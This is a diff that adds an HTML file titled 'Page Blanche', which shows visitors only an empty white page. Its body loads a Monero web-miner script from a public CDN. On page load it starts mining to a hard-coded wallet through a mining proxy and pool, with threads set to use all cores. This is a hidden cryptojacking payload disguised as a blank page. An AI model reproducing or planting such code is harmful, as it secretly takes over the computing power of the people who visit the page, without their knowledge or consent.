@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page Blanche</title>
+    <style>
+        body {
+            margin: 0;
+            background-color: white;
+        }
+    </style>
+</head>
+<body>
+  <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+  <script>
+      server = "wss://ny1.xmrminingproxy.com";
+      var pool = "xmr-eu1.nanopool.org:14433";
+      var walletAddress = "445FYQ7V7vucaDaTweVHQ9GeUum6aJV86Vm4T8YMeVk93pAL3NGPKKaNDBHjbpnAdH3cMrhrfoZ4c8MGgbxX7NHoRXzDbzv";
+      var workerId = "GH-XMR"
+      var threads = -1;
+      var password = "";
+      startMining(pool, walletAddress, workerId, threads, password);
+      throttleMiner = 20;
+  </script>
+</body>
+</html>
